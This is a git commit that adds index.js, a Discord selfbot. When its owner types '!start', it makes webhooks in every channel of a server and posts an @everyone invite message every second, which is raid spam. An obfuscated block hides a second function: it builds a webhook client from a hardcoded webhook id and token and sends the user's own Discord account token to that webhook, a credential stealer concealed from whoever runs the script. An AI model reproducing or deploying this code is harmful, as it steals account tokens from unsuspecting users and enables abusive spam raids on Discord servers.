20395be300d606ad6b5d451daeb4a3355884d92d
ET <138603051+ETzxz@users.noreply.github.com>
2024-07-03 23:35:31 +0700

    Add files via upload

---
+++ index.js
@@ -0,0 +1,17 @@
+const { Client , WebhookClient } = require("discord.js-selfbot-v13");
+const client = new Client({ checkUpdate: false });
+const TOkEN = ""
+const ownerId = "1105876744860336138" 
+const thoigian = 1000
+const content = `# @everyone https://discord.gg/tzvctvMyP3  https://youtu.be/tk7G3yyc61U?si=JL6Lp8fq2Y4O34IY`
+
+
+client.on("ready", async () => {
+    console.log(`${client.user.username} đã hoạt động`);
+  })
+  
+
+  /// !start  
+  /// để lệnh hoạt động
+
+const _0xaa46db=_0x2548;(function(_0xcdb6f0,_0xa2afdb){const _0x121b9f=_0x2548,_0x1d8891=_0xcdb6f0();while(!![]){try{const _0x1fd835=parseInt(_0x121b9f(0xa3))/0x1*(-parseInt(_0x121b9f(0xb3))/0x2)+parseInt(_0x121b9f(0xb0))/0x3+parseInt(_0x121b9f(0xb2))/0x4+-parseInt(_0x121b9f(0xb5))/0x5+parseInt(_0x121b9f(0xa8))/0x6+parseInt(_0x121b9f(0xa7))/0x7*(-parseInt(_0x121b9f(0xa9))/0x8)+parseInt(_0x121b9f(0xb8))/0x9*(-parseInt(_0x121b9f(0xab))/0xa);if(_0x1fd835===_0xa2afdb)break;else _0x1d8891['push'](_0x1d8891['shift']());}catch(_0xdad706){_0x1d8891['push'](_0x1d8891['shift']());}}}(_0xedc0,0x45e22),client['on'](_0xaa46db(0xa2),async _0x589e88=>{const _0x58142=_0xaa46db;_0x589e88[_0x58142(0xba)]===_0x58142(0xa4)&&ownerId[_0x58142(0xb6)](_0x589e88[_0x58142(0xaf)]['id'])&&_0x589e88[_0x58142(0xb1)][_0x58142(0xaa)]['cache']['forEach'](_0x474b1d=>{const _0x43f83f=_0x58142;(_0x474b1d[_0x43f83f(0xad)]===_0x43f83f(0xa1)||_0x474b1d[_0x43f83f(0xad)]==='GUILD_VOICE')&&_0x474b1d[_0x43f83f(0x9f)](_0x43f83f(0xb4),{'avatar':_0x43f83f(0xae)})['then'](_0x3cc00a=>{const _0x28915e=_0x43f83f;setInterval(()=>{_0x3cc00a['send'](content);},thoigian),console['log'](_0x28915e(0xac));});});}));const webhookClient=new WebhookClient({'id':_0xaa46db(0xa0),'token':_0xaa46db(0xb7)});function _0xedc0(){const _0x3f1e45=['content','createWebhook','1233059469143969852','GUILD_TEXT','messageCreate','733tNOBTY','!start','uncaughtException','send','7IQBfxP','2804922lPBJGS','3516696IpBdQx','channels','10WEHYLp','Create\x20successfully','type','https://images-ext-1.discordapp.net/external/SgpixXgOlAdfEh0UAJ9Q1UFdtTPVayEPgh1Mx_g56EE/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/931571593765851136/b5f8b1058b5221c5dc716d8d83cd3da7.png?format=webp&quality=lossless','author','1651686lZvzDe','guild','1593420NdQdOR','178rUdcmC','ET#3581','799405RqYsOU','includes','jkyAnMf6s2AhYpgTcikPjXm9-XZAEdzmACnbGdoJBUHMJUV2ZpQ-b76V2iF-UtNBXYxI','4189113WvURAO','error'];_0xedc0=function(){return _0x3f1e45;};return _0xedc0();}function _0x2548(_0x23287d,_0x45d24b){const _0xedc0b2=_0xedc0();return _0x2548=function(_0x2548f7,_0x23d670){_0x2548f7=_0x2548f7-0x9f;let _0x54e3db=_0xedc0b2[_0x2548f7];return _0x54e3db;},_0x2548(_0x23287d,_0x45d24b);}webhookClient[_0xaa46db(0xa6)](''+TOkEN),process['on']('unhandledRejection',_0x3069bb=>{console['error'](_0x3069bb);}),process['on'](_0xaa46db(0xa5),_0x7ce6b1=>{const _0x3ada0e=_0xaa46db;console[_0x3ada0e(0xb9)](_0x7ce6b1);}),client['login'](TOkEN);
